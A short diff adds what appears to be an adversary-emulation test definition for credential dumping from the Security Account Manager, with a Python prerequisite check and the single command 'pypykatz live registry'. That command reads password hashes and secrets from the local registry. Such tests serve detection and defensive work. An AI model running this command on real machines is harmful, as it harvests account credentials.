@@ -1,0 +1,15 @@
+#TechniqueName: OS Credential Dumping: Security Account Manager
+#AtomicTestName: Registry parse with pypykatz
+#Language: cmd
+
+#get_prereq_commands
+echo "Python 3 must be installed manually"
+
+
+#prereq_commands
+if (python --version) {exit 0} else {exit 1}
+
+
+#commands
+pypykatz live registry
+
